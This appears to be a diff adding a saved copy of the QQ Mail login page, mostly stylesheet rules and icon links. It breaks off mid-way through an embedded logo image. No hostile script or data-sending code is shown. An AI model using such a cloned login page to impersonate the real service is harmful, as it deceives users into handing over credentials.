@@ -1,0 +1,991 @@
+<!DOCTYPE html>
+<!-- saved from url=(0020)https://mail.qq.com/ -->
+<html lang="zh-cmn">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=gb18030" />
+
+    <title>登录QQ邮箱</title>
+    <meta name="renderer" content="webkit" />
+    <meta name="save" content="history" />
+    <meta name="description" content="QQ 邮箱登录" />
+    <style>
+      body,
+      p,
+      dl,
+      dd,
+      h1,
+      h2,
+      h3,
+      h4,
+      h5,
+      h6,
+      pre,
+      form,
+      fieldset,
+      legend {
+        margin: 0;
+      }
+      ul,
+      ol,
+      fieldset {
+        margin: 0;
+        padding: 0;
+      }
+      table {
+        font-size: inherit;
+      }
+      fieldset,
+      img {
+        border: none;
+      }
+      ul,
+      ol,
+      li {
+        list-style: none;
+      }
+      html {
+        overflow: auto\9;
+      }
+      body {
+        font-size: 12px;
+      }
+      html,
+      body {
+        background-color: #fff;
+      }
+      body,
+      input,
+      textarea,
+      select,
+      button {
+        font-family: "lucida Grande", Verdana, "Microsoft YaHei";
+      }
+      input,
+      textarea,
+      select,
+      button {
+        font-size: inherit;
+      }
+      a {
+        color: #225592;
+        text-decoration: none;
+      }
+      a:hover {
+        text-decoration: underline;
+      }
+      ::-webkit-input-placeholder {
+        color: #8b9096;
+      }
+      :-moz-placeholder {
+        color: #8b9096;
+      }
+      .login_button {
+        display: inline-block;
+        *display: inline;
+        *zoom: 1;
+        box-sizing: border-box;
+        width: auto;
+        height: 40px;
+        height: 38px\9;
+        line-height: 38px;
+        padding: 0 20px;
+        margin-top: 9px;
+        *vertical-align: -6px;
+        font-size: 16px;
+        font-weight: normal;
+        color: #fff;
+        text-align: center;
+        background: #5a98de;
+        border-radius: 3px;
+        -webkit-appearance: none;
+        -moz-appearance: none;
+        appearance: none;
+        outline: none;
+        border: none;
+        cursor: pointer;
+      }
+      .login_button:hover,
+      .login_button:focus {
+        background: #6aa2e0;
+        text-decoration: none;
+      }
+      .login_button:active {
+        background: #5a98de;
+      }
+      .container {
+        min-height: 500px;
+      }
+      .header {
+        height: 62px;
+        overflow: hidden;
+        zoom: 1;
+        border-bottom: 1px solid #d6dfea;
+        background: #eff4fa;
+      }
+      .header_logo {
+        float: left;
+        _display: inline;
+        width: 182px;
+        height: 35px;
+        margin-top: 14px;
+        margin-left: 17px;
+        text-indent: -9999em;
+        background-size: 182px 35px;
+        background-repeat: no-repeat;
+        background-position: left center;
+        background-image: url(/zh_CN/htmledition/images/logo/qqmail/qqmail_logo_default_35h206ff1.png);
+        _background-image: url(/zh_CN/htmledition/images/logo/qqmail/qqmail_logo_default_35h_png8206ff1.png);
+      }
+      .header_link {
+        overflow: hidden;
+        margin-top: 16px;
+        padding-right: 17px;
+        line-height: 30px;
+        text-align: right;
+        color: #b6b6b6;
+      }
+      .header a,
+      .footer a {
+        color: #1d5494;
+      }
+      .content {
+        width: 960px;
+        margin: 32px auto;
+        padding: 0 24px;
+      }
+      .content_wrapper {
+        min-height: 372px;
+        padding-top: 40px;
+        margin: 0 20px 60px 25px;
+        *zoom: 1;
+      }
+      .content_wrapper:after {
+        content: "";
+        display: block;
+        width: 0;
+        height: 0;
+        clear: both;
+      }
+      .footer {
+        position: fixed;
+        _position: static;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        z-index: 2;
+        clear: both;
+        line-height: 36px;
+        text-align: center;
+        color: #b6b6b6;
+        background-color: #eff4fa;
+        border-top: 1px solid #d6dfea;
+      }
+      .login_msg {
+        padding: 18px 5px;
+        color: #7e4f01;
+        line-height: 18px;
+        background: none;
+        border-bottom: 2px solid #dcdcdc;
+        margin-left: 20px;
+        margin-right: 20px;
+      }
+      .login_msg p {
+        font-size: 14px;
+        font-weight: bold;
+        color: #885429;
+      }
+      .login_msg ul {
+        margin: 6px 0 0 18px;
+      }
+      .login_msg li {
+        list-style: disc outside;
+        color: #6e6e6e;
+      }
+      .login_msg_warning {
+        display: inline-block;
+        *display: inline;
+        *zoom: 1;
+        width: 22px;
+        height: 18px;
+        background: url(/zh_CN/htmledition/images/icon_ptloginpage1e9c5d.png) -131px -16px
+          no-repeat;
+        margin-right: 4px;
+        vertical-align: -3px;
+      }
+      .login_container {
+        float: right;
+        border: 1px solid #a0b1c4;
+        width: 334px;
+        height: 387px;
+        _height: 371px;
+        background-color: #fff;
+        position: relative;
+        z-index: 12;
+        padding: 0;
+        border-radius: 5px;
+        overflow: hidden;
+      }
+      .login_box {
+        position: relative;
+        z-index: 11;
+        width: 305px;
+        margin-right: 4px;
+        padding: 20px;
+        border: 1px solid #acc3e4;
+        background: #edf5ff;
+        box-shadow: 2px 2px 3px rgba(0, 0, 0, 0.15);
+        border-radius: 5px;
+      }
+      .login_box_header {
+        text-align: center;
+        padding: 16px 0;
+        background-color: #f9fbfe;
+        border-bottom: 1px solid #c0cdd9;
+      }
+      .login_box_title {
+        font-size: 16px;
+        font-weight: normal;
+        color: #333;
+        cursor: default;
+      }
+      .login_box_msg {
+        margin: 12px 25px -4px;
+        color: #f00;
+        text-align: left;
+      }
+      .login_box .noCookie,
+      .login_box .noScript {
+        padding: 6px;
+        border: 1px solid #fadc80;
+        line-height: 1.5;
+        color: black;
+        background: #fff9e3;
+      }
+      .login_box .alias {
+        width: 174px;
+        padding-right: 125px;
+      }
+      .login_box .login_https {
+        text-align: right;
+        margin-top: -16px;
+      }
+      .login_box .txt {
+        position: relative;
+        width: 274px;
+        height: 25px;
+        line-height: 18px;
+        padding: 5px 4px;
+        overflow: hidden;
+        color: #494949;
+        border: 1px solid #96a5b4;
+        font-size: 20px;
+        background: transparent;
+        outline: none;
+        border-radius: 2px;
+      }
+      .login_box .txt:focus {
+        border: 1px solid #4892e7;
+      }
+      .login_box .txt_placeholder {
+        position: absolute;
+        top: 7px;
+        left: 1px;
+        width: 268px;
+        height: 34px;
+        padding: 0 7px;
+        line-height: 34px;
+        font-size: 14px;
+        color: #8b9096;
+      }
+      .login_box .txt_dim {
+        color: #dcdddf;
+      }
+      .login_box .login_button {
+        min-width: 140px;
+      }
+      .login_box .about_password {
+        padding: 4px 0;
+      }
+      .login_box .about_password a {
+        position: absolute;
+        right: 0;
+        padding-top: 4px\9;
+      }
+      .login_box .remerber_password {
+        margin-right: 4px;
+        margin-left: -4px\9;
+        vertical-align: middle;
+      }
+      .login_box .captips {
+        position: absolute;
+        top: 43px;
+        left: 0;
+        z-index: 20;
+        padding: 1px;
+        border: 1px solid;
+        border-color: #dbc492 #b49366 #b49366 #dbc492;
+        background: #fdf6aa;
+      }
+      .login_box .vfcode {
+        margin-top: 0px;
+      }
+      .login_box .vfcode_img {
+        float: left;
+        text-align: left;
+        padding: 5px 0 0;
+        padding-top: 6px\9;
+        margin-bottom: 10px;
+      }
+      .login_box .vfcodeinput {
+        position: relative;
+        float: left;
+        padding: 5px 0;
+      }
+      .login_box .vfcode_img img {
+        width: 138px;
+        height: 53px;
+        border: 1px solid #cfd7e2;
+        vertical-align: middle;
+        cursor: pointer;
+        margin-right: 10px;
+      }
+      .login_box .verifytip,
+      .login_box .vfcode_change {
+        padding: 10px 0 3px;
+      }
+      .login_box .login_tips {
+        padding-top: 15px;
+        line-height: 18px;
+      }
+      .login_box .login_tips p {
+        margin-top: 3px;
+      }
+      .login_operate {
+        padding: 12px 0 20px;
+      }
+      .login_operate .username,
+      .login_operate .password,
+      .login_operate .about_password,
+      .login_operate .login_submit {
+        position: relative;
+        width: 284px;
+        padding: 5px 0;
+        z-index: 2\9;
+      }
+      .login_operate .login_submit {
+        padding-bottom: 25px;
+        clear: both;
+      }
+      .login_submit .login_cancel {
+        margin-left: 15px;
+        font-size: 14px;
+      }
+      .login_operate .username {
+        height: 38px;
+        line-height: 38px;
+        z-index: 10\9;
+      }
+      .login_operate .username_immutable {
+        display: block;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        color: #494949;
+        font-size: 18px;
+        font-weight: bold;
+      }
+      .login_operate .about_password {
+        padding: 4px 0;
+        z-index: 1\9;
+      }
+      .login_operate .vfcodeinput {
+        height: 40px;
+        padding-bottom: 3px;
+      }
+      .login_domain {
+        position: absolute;
+        top: 6px;
+        *top: 7px;
+        right: 1px;
+        width: 112px;
+        height: 31px;
+        line-height: 32px;
+        padding: 0 0 3px 8px;
+        border: none;
+        border-left: 1px solid #d5deec;
+        color: #4d4d4c;
+        font-size: 18px;
+        z-index: 1;
+        cursor: pointer;
+        background: url(/zh_CN/htmledition/images/login_ico_selector1e9c5d.gif)
+          no-repeat scroll 105px -25px #fbfbfb;
+        border-radius: 0 3px 3px 0;
+        box-shadow: -1px 0 2px rgba(0, 0, 0, 0.09);
+      }
+      .active .login_domain,
+      .login_domain:hover {
+        background-position: 105px 11px;
+        background-color: #f7fafe;
+      }
+      @-webkit-keyframes domains_show {
+        0% {
+          opacity: 0;
+        }
+        100% {
+          opacity: 1;
+        }
+      }
+      @-moz-keyframes domains_show {
+        0% {
+          opacity: 0.5;
+          top: 4px;
+          height: 24px;
+        }
+        100% {
+          opacity: 1;
+          top: -35px;
+          height: 96px;
+        }
+      }
+      @keyframes domains_show {
+        0% {
+          opacity: 0.5;
+          top: 4px;
+          height: 24px;
+        }
+        100% {
+          opacity: 1;
+          top: -35px;
+          height: 96px;
+        }
+      }
+      @-webkit-keyframes domains_show_item {
+        0% {
+          margin-top: -39px;
+        }
+        100% {
+          margin-top: 0;
+        }
+      }
+      @-moz-keyframes domains_show_item {
+        0% {
+          margin-top: -39px;
+        }
+        100% {
+          margin-top: 0;
+        }
+      }
+      @keyframes domains_show_item {
+        0% {
+          margin-top: -39px;
+        }
+        100% {
+          margin-top: 0;
+        }
+      }
+      .login_domains_show {
+        -webkit-animation-name: domains_show;
+        -webkit-animation-duration: 0.1s;
+        -webkit-animation-timing-function: ease-out;
+        -moz-animation-name: domains_show;
+        -moz-animation-duration: 0.1s;
+        -moz-animation-timing-function: ease-out;
+        animation-name: domains_show;
+        animation-duration: 0.1s;
+        animation-timing-function: ease-out;
+      }
+      .login_domains_show .auto_item:first-child {
+        -webkit-animation-name: domains_show_item;
+        -webkit-animation-duration: 0.1s;
+        -webkit-animation-timing-function: ease-out;
+        -moz-animation-name: domains_show_item;
+        -moz-animation-duration: 0.1s;
+        -moz-animation-timing-function: ease-out;
+        animation-name: domains_show_item;
+        animation-duration: 0.1s;
+        animation-timing-function: ease-out;
+      }
+      .login_pictures {
+        position: relative;
+        margin-right: 395px;
+      }
+      .login_pictures_picture {
+        position: absolute;
+        left: 0;
+        right: 0;
+        top: 0;
+        height: 400px;
+        _width: 100%;
+        background-repeat: no-repeat;
+        background-position: right center;
+      }
+      .login_pictures_txt {
+        padding-top: 25px;
+        position: relative;
+        font-size: 14px;
+        font-weight: normal;
+        line-height: 24px;
+      }
+      .login_pictures_title {
+        line-height: 26px;
+        margin-top: 15px;
+        margin-bottom: 15px;
+        font-size: 24px;
+        font-weight: normal;
+        color: #6f95c8;
+      }
+      .login_pictures_info {
+        margin-top: 6px;
+        font-size: 12px;
+      }
+      .autocomplete {
+        display: block;
+        position: absolute;
+        right: -6px;
+        top: -35px;
+        z-index: 3;
+        width: 130px;
+        overflow: hidden;
+        margin: 1px 0 0 0;
+        padding: 5px 0;
+        border: 1px solid #9bbbda;
+        color: #4d4d4c;
+        background: #ffffff;
+        outline: none;
+        box-shadow: 0 0 3px rgba(110, 189, 222, 0.5);
+        -webkit-box-shadow: 0 0 3px rgba(110, 189, 222, 0.5);
+        border-radius: 3px;
+        -webkit-border-radius: 3px;
+      }
+      .auto_item {
+        position: relative;
+        height: 34px;
+        padding-left: 24px;
+        font-size: 14px;
+        line-height: 30px;
+        background: #ffffff;
+        cursor: pointer;
+      }
+      .autocomplete .auto_select {
+        background: #ecf5ff;
+      }
+      .independent_password {
+        min-height: 340px;
+      }
+      .independent_password .login_operate .username {
+        margin-bottom: -10px;
+      }
+      .second_login_box {
+        border: none;
+        background-color: #fff;
+        width: 100%;
+        -webkit-box-shadow: none;
+        border-radius: 0;
+        -webkit-border-radius: 0;
+        min-height: 345px;
+        _height: 321px;
+        padding: 0 0 25px 0;
+      }
+      .second_login_box .login_operate {
+        padding: 20px 0px;
+        margin: 0 auto;
+        width: 285px;
+      }
+      .second_login_box .login_operate .password {
+        margin-bottom: 1px;
+      }
+      .second_login_box .login_box_forgotpassword {
+        position: absolute;
+        right: 16px;
+        bottom: 15px;
+      }
+      .independent_password .login_operate .username {
+        margin-bottom: -4px;
+      }
+      .mail_intro {
+        width: 400px;
+        margin-left: 16px;
+      }
+      .mail_intro h1 {
+        display: none;
+      }
+      .mail_intro ul {
+        line-height: 20px;
+      }
+      .mail_intro ul li {
+        margin-left: 16px;
+        list-style: disc outside;
+      }
+      .mask {
+        position: fixed;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        background: #fff;
+        opacity: 0.6;
+        filter: alpha(opacity=60);
+      }
+      .gray {
+        color: #868686;
+      }
+      @media (min-width: 1070px) {
+        .header,
+        .footer {
+          min-width: 1070px;
+        }
+        .header_logo {
+          margin-left: 40px;
+        }
+        .header_link {
+          padding-right: 40px;
+        }
+      }
+      @media (max-height: 670px) {
+        .footer {
+          position: static;
+        }
+      }
+      @media (-webkit-min-device-pixel-ratio: 2),
+        (min--moz-device-pixel-ratio: 2),
+        (-o-min-device-pixel-ratio: 2),
+        (min-device-pixel-ratio: 2),
+        (min-resolution: 2dppx) {
+        .header_logo {
+          background-image: url(/zh_CN/htmledition/images/logo/qqmail/qqmail_logo_default_70h206ff1.png);
+        }
+      }
+      .xm_login_container {
+        width: 334px !important;
+        height: 387px !important;
+      }
+      .xm_login_card {
+        position: relative;
+        width: 100%;
+        height: 100%;
+      }
+      .xm_login_card_cnt {
+        position: relative;
+        width: 100%;
+        height: 336px;
+      }
+      .xm_login_card_tab {
+        height: 50px;
+        font-size: 0;
+        border-bottom: 1px solid #a0b1c4;
+        background-color: #f9fbfe;
+        border-radius: 6px 6px 0 0;
+      }
+      .xm_login_card_tab_item {
+        float: left;
+        width: 50%;
+        font-size: 16px;
+        line-height: 50px;
+        color: #999;
+        text-align: center;
+        cursor: pointer;
+      }
+      .xm_login_card_tab_item_Active {
+        color: #333;
+      }
+      .xm_login_card_wx {
+        width: 1200px;
+        height: 100%;
+        position: absolute;
+        right: 0;
+        top: 0;
+        bottom: 0;
+        z-index: 1;
+        background-color: #fff;
+      }
+      .xm_login_card_qq {
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        left: 0;
+        top: 0;
+        bottom: 0;
+        z-index: 2;
+        background-color: #fff;
+      }
+      .xm_login_card_state {
+        position: absolute;
+        top: 229px;
+        left: 1032px;
+        z-index: 1;
+        width: 100%;
+        text-align: center;
+        line-height: 18px;
+        margin-top: 24px;
+      }
+      .xm_login_card_state > p {
+        font-size: 13px;
+        color: #000;
+        width: 100px;
+        margin-left: -50px;
+      }
+      .xm_login_card_state > p > a {
+        width: 11px;
+        height: 11px;
+        border: 1px solid #c8d3de;
+        border-radius: 1px;
+        display: inline-block;
+        vertical-align: top;
+        margin-top: 3px;
+        cursor: pointer;
+      }
+      .xm_login_card_state > p > span {
+        cursor: pointer;
+        padding-left: 3px;
+      }
+      .xm_login_card_checked {
+        background: url(https://res.wx.qq.com/a/webmail/xmail/res/images/login/wx_login_box_check.859ec9f.png)
+          no-repeat 50%;
+        background-color: #328ffa;
+        background-size: 9px 8px;
+        border: 1px solid #328ffa !important;
+      }
+    </style>
+    <link
+      rel="icon"
+      type="images/png"
+      sizes="16*16"
+      href="https://mail.qq.com/zh_CN/htmledition/images/favicon/qqmail_favicon_16h.png"
+    />
+    <link
+      rel="icon"
+      type="images/png"
+      sizes="32*32"
+      href="https://mail.qq.com/zh_CN/htmledition/images/favicon/qqmail_favicon_32h.png"
+    />
+    <link
+      rel="icon"
+      type="images/png"
+      sizes="48*48"
+      href="https://mail.qq.com/zh_CN/htmledition/images/favicon/qqmail_favicon_48h.png"
+    />
+    <link
+      rel="icon"
+      type="images/png"
+      sizes="96*96"
+      href="https://mail.qq.com/zh_CN/htmledition/images/favicon/qqmail_favicon_96h.png"
+    />
+    <meta name="theme-color" content="gray" />
+  </head>
+  <body>
+    <div class="container">
+      <div class="header">
+        <img
+          src="data:image/png;base64,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